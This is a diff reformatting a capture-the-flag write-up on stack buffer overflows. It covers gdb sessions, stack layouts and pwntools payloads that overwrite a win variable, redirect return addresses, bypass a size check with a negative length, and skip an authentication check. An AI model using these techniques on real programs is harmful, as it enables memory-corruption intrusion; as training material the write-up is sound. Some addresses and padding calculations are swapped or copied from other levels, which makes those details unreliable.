@@ -238,7 +238,7 @@ ebp ------> | 0x00007fff85a4bd30 (rsp+0x00b0) | 70 cd a4 85 ff 7f 00 00 | 0x0000
 ```
 {% endcode %}
 
-* The buffer is 87 bytes long, which means that it only covers 7 bytes out of the word at `(rsp+0x0090)`.
+The buffer is 87 bytes long, which means that it only covers 7 bytes out of the word at `(rsp+0x0090)`.
 
 ```
 Buffer:                           Padding byte:           Win variable:
@@ -256,9 +256,11 @@ Buffer:                           Padding byte:           Win variable:
 00 00 00 00 00 00 00 
 ```
 
-* The buffer ends, we have a null byte and then we have our win variable.
-* We have to change the value of the win variable to `0x2dbba028`.
-* Let's build our payload.
+The buffer ends, we have a null byte and then we have our win variable.
+
+We have to change the value of the win variable to `0x2dbba028`.
+
+Let's build our payload.
 
 ```python
 from pwn import *
@@ -283,12 +285,15 @@ p.interactive()
 
 > Overflow a buffer on the stack to set trickier conditions to obtain the flag!
 
-* This time we are not given any information by the program.
-* In order to create a payload we need to know three things:
-  * [ ] Location of buffer.
-  * [ ] Location of win variable.
-  * [ ] Value being compared to win variable.
-* Let's open the program in `gdb`.
+This time we are not given any information by the program.
+
+In order to create a payload we need to know three things:
+
+* [ ] Location of buffer.
+* [ ] Location of win variable.
+* [ ] Value being compared to win variable.
+
+Let's open the program in `gdb`.
 
 ```
 gef➤  run
@@ -297,7 +302,7 @@ gef➤  run
 Send your payload (up to 10 bytes)!
 ```
 
-* Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
+Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
 
 ```
 gef➤  finish
@@ -305,22 +310,24 @@ Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ff
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
-* The program has now read our payload.
-* The `read` syscall takes the following arguments:
+The program has now read our payload.
+
+The `read` syscall takes the following arguments:
 
 ```c
 ssize_t read(int fd, void buf[.count], size_t count);
 ```
 
-* We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
+We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
 
 ```
 gef➤  p $rsi
 $2 = 0x7ffc615eeba0
 ```
 
-* Now we know that the buffer starts at `0x7ffc615eeba0`.
-* Let's disassemble the program:
+Now we know that the buffer starts at `0x7ffc615eeba0`.
+
+Let's disassemble the program:
 
 ```
 gef➤  disassemble
@@ -336,29 +343,35 @@ Dump of assembler code for function challenge:
 ; -- snip --
 ```
 
-* This block of code decides whether we get the flag or not.
-* We can see that the `cmp` instruction is comparing `0x47ba9894` with the value stored in $eax.
-* And from the two lines above, we learn that the value in $eax is moved from dereferenced `[rbp-0x88]`.
-* Let's check the value of `[rbp-0x88]`:
+This block of code decides whether we get the flag or not.
+
+We can see that the `cmp` instruction is comparing `0x47ba9894` with the value stored in $eax.
+
+And from the two lines above, we learn that the value in $eax is moved from dereferenced `[rbp-0x88]`.
+
+Let's check the value of `[rbp-0x88]`:
 
 ```
 gef➤  x/a $rbp - 0x88
 0x7ffc615eeb98: 0x7ffc615eec14
 ```
 
-* The location of the win variable is `0x7ffc615eec14`.
-* So we have all the information we need:
-  * [x] Location of buffer: `0x7ffc615eec14`
-  * [x] Location of win variable: `0x7ffc615eeba0`
-  * [x] Value being compared to win variable: `0x47ba9894`
-* Let's find the distance between the buffer and win variable in order to get the length of our payload padding.
+The location of the win variable is `0x7ffc615eec14`.
+
+So we have all the information we need:
+
+* [x] Location of buffer: `0x7ffc615eec14`
+* [x] Location of win variable: `0x7ffc615eeba0`
+* [x] Value being compared to win variable: `0x47ba9894`
+
+Let's find the distance between the buffer and win variable in order to get the length of our payload padding.
 
 ```
 gef➤  p/d 0x7fff0c8f8e98 - 0x7fff0c8f8e10
 $3 = 136
 ```
 
-* We are all set to craft our payload.
+We are all set to craft our payload.
 
 ```python
 from pwn import *
@@ -408,8 +421,9 @@ ebp ------> | 0x00007ffd2e328c80 (rsp+0x0080) | b0 9c 32 2e fd 7f 00 00 | 0x0000
 ```
 {% endcode %}
 
-* This time there's no pointer to the buffer or to the win variable as there is no win variable in the first place.
-* In order to execute the `win` function, we have to overwrite the return address with the address of the `win` function.
+This time there's no pointer to the buffer or to the win variable as there is no win variable in the first place.
+
+In order to execute the `win` function, we have to overwrite the return address with the address of the `win` function.
 
 ```
 Buffer:                           Padding byte:                     Return address:
@@ -424,7 +438,7 @@ Buffer:                           Padding byte:                     Return addre
 00 
 ```
 
-* Let's open the program in `gdb`.
+Let's open the program in `gdb`.
 
 ```
 (gdb) disassemble win
@@ -435,8 +449,9 @@ Dump of assembler code for function win:
 ; -- snip --
 ```
 
-* As we can see the location of the `win` function is `0x000000000040236c`.
-* Let's craft our payload.
+As we can see the location of the `win` function is `0x000000000040236c`.
+
+Let's craft our payload.
 
 ```python
 from pwn import *
@@ -459,10 +474,11 @@ p.interactive()
 
 > Overflow a buffer and smash the stack to obtain the flag!
 
-* In order to create a payload we need to know three things:
-  * [ ] Location of buffer.
-  * [ ] Location of stored return address.
-  * [ ] Address of win function.
+In order to create a payload we need to know three things:
+
+* [ ] Location of buffer.
+* [ ] Location of stored return address.
+* [ ] Address of win function.
 
 ```
 gef➤  run
@@ -479,40 +495,46 @@ Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ff
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
-* The program has now read our payload.
-* The `read` syscall takes the following arguments:
+The program has now read our payload.
+
+The `read` syscall takes the following arguments:
 
 ```c
 ssize_t read(int fd, void buf[.count], size_t count);
 ```
 
-* We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
+We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
 
 ```
 gef➤  p $rsi
 $2 = 0x7fff0c8f8e10
 ```
 
-* In this challenge, we have no `win` variable to overwrite.
-* The way we can divert flow of the program is by overwriting the return address.
-* We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
-* Let's check this:
+In this challenge, we have no `win` variable to overwrite.
+
+The way we can divert flow of the program is by overwriting the return address.
+
+We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
+
+Let's check this:
 
 ```
 gef➤  x/a $rbp
 0x7fff0c8f8e90: 0x7fff0c8f9ec0
 ```
 
-* The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.
-* And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
+The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.
+
+And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
 
 ```
 gef➤  x/a $rbp + 8
 0x7fff0c8f8e98: 0x4024be <main+238>
 ```
 
-* As we can see the return address is `<main+238>` and it is located at `0x7fff0c8f8e98`.
-* We want to replace this value with the address of the `win` function.
+As we can see the return address is `<main+238>` and it is located at `0x7fff0c8f8e98`.
+
+We want to replace this value with the address of the `win` function.
 
 ```
 gef➤  disass win
@@ -521,19 +543,22 @@ Dump of assembler code for function win:
 ; -- snip --
 ```
 
-* As we can see the `win` function starts at `0x0000000000402184`.
-* We now have the information we need:
-  * [x] Location of buffer: `0x7fff0c8f8e10`.
-  * [x] Location of stored return address: `0x7fff0c8f8e98`.
-  * [x] Address of win function: `0x0000000000402184`.
-* Let's calculate the padding required.
+As we can see the `win` function starts at `0x0000000000402184`.
+
+We now have the information we need:
+
+* [x] Location of buffer: `0x7fff0c8f8e10`.
+* [x] Location of stored return address: `0x7fff0c8f8e98`.
+* [x] Address of win function: `0x0000000000402184`.
+
+Let's calculate the padding required.
 
 ```
 gef➤  p/d 0x7fff0c8f8e98 - 0x7fff0c8f8e10
 $3 = 136
 ```
 
-* We can now create our payload.
+We can now create our payload.
 
 ```python
 from pwn import *
@@ -556,7 +581,7 @@ p.interactive()
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
 
-* Our stack frame looks something like this:
+Our stack frame looks something like this:
 
 {% code fullWidth="false" %}
 ```
@@ -585,7 +610,7 @@ rbp ------> | 0x00007ffd17398440 (rsp+0x0080) | 70 94 39 17 fd 7f 00 00 | 0x0000
 ```
 {% endcode %}
 
-* Again, we have to overwrite the return address in order to divert control flow.
+Again, we have to overwrite the return address in order to divert control flow.
 
 ```
 Buffer:                           Random bytes:                     Return address:
@@ -600,7 +625,7 @@ Buffer:                           Random bytes:                     Return addre
 00 00 00 00 00 00 00
 ```
 
-* Let's find the address of the `win` function.
+Let's find the address of the `win` function.
 
 {% code fullWidth="false" %}
 ```
@@ -613,11 +638,15 @@ Dump of assembler code for function win:
 ```
 {% endcode %}
 
-* The program does not want us to overflow the buffer, so it tries to ensure that the payload size we set is lower than the buffer size.
-* However we can use the concept of [two's compliment](https://en.wikipedia.org/wiki/Two's\_complement) to our advantage.
-* The two's-compliment of `-1` is `0xffffffff`. If we enter the payload size to be `-1`, the program will interpret it as an unsigned `4294967295` instead of a signed `-1`.
-* And thus, we can pass the check.
-* Let's craft our payload:
+The program does not want us to overflow the buffer, so it tries to ensure that the payload size we set is lower than the buffer size.
+
+However we can use the concept of [two's compliment](https://en.wikipedia.org/wiki/Two's\_complement) to our advantage.
+
+The two's-compliment of `-1` is `0xffffffff`. If we enter the payload size to be `-1`, the program will interpret it as an unsigned `4294967295` instead of a signed `-1`.
+
+And thus, we can pass the check.
+
+Let's craft our payload:
 
 ```python
 from pwn import *
@@ -640,10 +669,11 @@ p.interactive()
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
 
-* In order to create a payload we need to know three things:
-  * [ ] Location of buffer.
-  * [ ] Location of stored return address.
-  * [ ] Address of win function.
+In order to create a payload we need to know three things:
+
+* [ ] Location of buffer.
+* [ ] Location of stored return address.
+* [ ] Address of win function.
 
 ```
 gef➤  run
@@ -652,7 +682,7 @@ gef➤  run
 Send your payload (up to 10 bytes)!
 ```
 
-* Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
+Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
 
 ```
 gef➤  finish
@@ -660,40 +690,46 @@ Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ff
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
-* The program has now read our payload.
-* The `read` syscall takes the following arguments:
+The program has now read our payload.
+
+The `read` syscall takes the following arguments:
 
 ```c
 ssize_t read(int fd, void buf[.count], size_t count);
 ```
 
-* We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
+We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
 
 ```
 gef➤  p $rsi
 $2 = 0x7ffd98ad7380
 ```
 
-* In this challenge, we have no `win` variable to overwrite.
-* The way we can divert flow of the program is by overwriting the return address.
-* We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
-* Let's check this:
+In this challenge, we have no `win` variable to overwrite.
+
+The way we can divert flow of the program is by overwriting the return address.
+
+We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
+
+Let's check this:
 
 ```
 gef➤  x/a $rbp
 0x7ffd98ad73d0: 0x7ffd98ad8400
 ```
 
-* The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.
-* And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
+The base pointer `$rbp` has the value `0x7fff0c8f8e90` and it points to `0x7fff0c8f9ec0` which is the `$rbp` of the caller function.
+
+And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
 
 ```
 gef➤  x/a $rbp + 8
 0x7ffd98ad73d8: 0x401c6b <main+238>
 ```
 
-* As we can see the return address is `main+238` and it is located at `0x7ffd98ad73d8`.
-* We want to replace this value with the address of the `win` function.
+As we can see the return address is `main+238` and it is located at `0x7ffd98ad73d8`.
+
+We want to replace this value with the address of the `win` function.
 
 ```
 gef➤  disass win
@@ -702,19 +738,22 @@ Dump of assembler code for function win:
 ; -- snip --
 ```
 
-* As we can see the win function starts at `0x0000000000401958`.
-* We now have the information we need:
-  * [x] Location of buffer: `0x7ffd98ad7380`.
-  * [x] Location of stored return address: `0x7ffd98ad73d8`.
-  * [x] Address of win function: `0x0000000000401958`.
-* Let's calculate the padding required.
+As we can see the win function starts at `0x0000000000401958`.
+
+We now have the information we need:
+
+* [x] Location of buffer: `0x7ffd98ad7380`.
+* [x] Location of stored return address: `0x7ffd98ad73d8`.
+* [x] Address of win function: `0x0000000000401958`.
+
+Let's calculate the padding required.
 
 ```
 gef➤  p/d 0x7ffd98ad73d8 - 0x7ffd98ad7380
 $3 = 88
 ```
 
-* We can now create our payload.
+We can now create our payload.
 
 ```python
 from pwn import *
@@ -737,8 +776,9 @@ p.interactive()
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-* In this level, the `win_authed` function checks if it's argument is `0x1337`. If it isn't, we don't get the flag.
-* For now, instead of trying to pass it, we will just skip over this check.
+In this level, the `win_authed` function checks if it's argument is `0x1337`. If it isn't, we don't get the flag.
+
+For now, instead of trying to pass it, we will just skip over this check.
 
 ```
             +---------------------------------+-------------------------+--------------------+
@@ -761,7 +801,7 @@ bp -------> | 0x00007ffe14fb87b0 (rsp+0x0060) | e0 97 fb 14 fe 7f 00 00 | 0x0000
 	    +---------------------------------+-------------------------+--------------------+
 ```
 
-* Let's look at the `win_authed` function in `gdb`.
+Let's look at the `win_authed` function in `gdb`.
 
 ```
 gef➤  disass win_authed
@@ -777,9 +817,11 @@ Dump of assembler code for function win_authed:
    ; -- snip --
 ```
 
-* We can see that the instruction at `0x00000000004016d3` is performing the check and the next instruction is making the jump.
-* In order to skip the check, we have to set the return address to `0x00000000004016e0`.
-* Before we do that we need to know the distance between the start of the buffer and location of return address.
+We can see that the instruction at `0x00000000004016d3` is performing the check and the next instruction is making the jump.
+
+In order to skip the check, we have to set the return address to `0x00000000004016e0`.
+
+Before we do that we need to know the distance between the start of the buffer and location of return address.
 
 ```
 Buffer:                           Random bytes:                     Return address:
@@ -790,7 +832,7 @@ Buffer:                           Random bytes:                     Return addre
 00 00 00 00 00 00 00 00           
 ```
 
-* As we can see the distance is `56` bytes. This means we need `56` bytes of padding in order to overwrite the return address.
+As we can see the distance is `56` bytes. This means we need `56` bytes of padding in order to overwrite the return address.
 
 ```python
 from pwn import *
@@ -813,10 +855,11 @@ p.interactive()
 
 > Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
 
-* In order to create a payload we need to know three things:
-  * [ ] Location of buffer.
-  * [ ] Location of stored return address.
-  * [ ] Address of win function.
+In order to create a payload we need to know three things:
+
+* [ ] Location of buffer.
+* [ ] Location of stored return address.
+* [ ] Address of win function.
 
 ```
 gef➤  run
@@ -825,7 +868,7 @@ gef➤  run
 Send your payload (up to 10 bytes)!
 ```
 
-* Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
+Once we are prompted to enter our payload we can press `CTRL C` and then enter our payload.
 
 ```
 gef➤  finish
@@ -833,40 +876,46 @@ Run till exit from #0  0x00007f7c7813dfd2 in __GI___libc_read (fd=0x0, buf=0x7ff
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
-* The program has now read our payload.
-* The `read` syscall takes the following arguments:
+The program has now read our payload.
+
+The `read` syscall takes the following arguments:
 
 ```c
 ssize_t read(int fd, void buf[.count], size_t count);
 ```
 
-* We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
+We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.
 
 ```
 gef➤  p $rsi
 $2 = 0x7ffdf99af5b0
 ```
 
-* In this challenge, we have no `win` variable to overwrite.
-* The way we can divert flow of the program is by overwriting the return address.
-* We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
-* Let's check this:
+In this challenge, we have no `win` variable to overwrite.
+
+The way we can divert flow of the program is by overwriting the return address.
+
+We know that the base pointer `$rbp` points to the saved base pointer of the caller function.
+
+Let's check this:
 
 ```
 gef➤  x/a $rbp
 0x7ffdf99af610: 0x7ffdf99b0640
 ```
 
-* The base pointer `$rbp` has the value `0x7ffdf99af610` and it points to `0x7ffdf99b0640` which is the `$rbp` of the caller function.
-* And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
+The base pointer `$rbp` has the value `0x7ffdf99af610` and it points to `0x7ffdf99b0640` which is the `$rbp` of the caller function.
+
+And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.
 
 ```
 gef➤  x/a $rbp + 8
 0x7ffdf99af618: 0x4019aa <main+238>
 ```
 
-* As we can see the return address is `main+238` and it is located at `0x7ffdf99af618`.
-* We want to replace this value with the address in the `win_authed` function such that it skips the check.
+As we can see the return address is `main+238` and it is located at `0x7ffdf99af618`.
+
+We want to replace this value with the address in the `win_authed` function such that it skips the check.
 
 ```
 gef➤  disass win_authed
@@ -881,19 +930,22 @@ Dump of assembler code for function win_authed:
    0x00000000004016a6 <+28>:    lea    rdi,[rip+0x95b]        # 0x402008
 ```
 
-* As we can see the win function starts at `0x000000000040168a`. However the address we want to overwrite the return address with is `0x00000000004016a6`.
-* We now have the information we need:
-  * [x] Location of buffer: `0x7ffdf99af5b0`.
-  * [x] Location of stored return address: `0x7ffdf99af618`.
-  * [x] Address to jump to: `0x00000000004016a6`.
-* Let's calculate the padding required.
+As we can see the win function starts at `0x000000000040168a`. However the address we want to overwrite the return address with is `0x00000000004016a6`.
+
+We now have the information we need:
+
+* [x] Location of buffer: `0x7ffdf99af5b0`.
+* [x] Location of stored return address: `0x7ffdf99af618`.
+* [x] Address to jump to: `0x00000000004016a6`.
+
+Let's calculate the padding required.
 
 ```
 gef➤  p/d 0x7ffdf99af618 - 0x7ffdf99af5b0
 $3 = 104
 ```
 
-* We can now create our payload.
+We can now create our payload.
 
 ```python
 from pwn import *
@@ -909,7 +961,3 @@ p.recvuntil('bytes)!')
 p.send(payload)
 p.interactive()
 ```
-
-
-
-## level 7.0
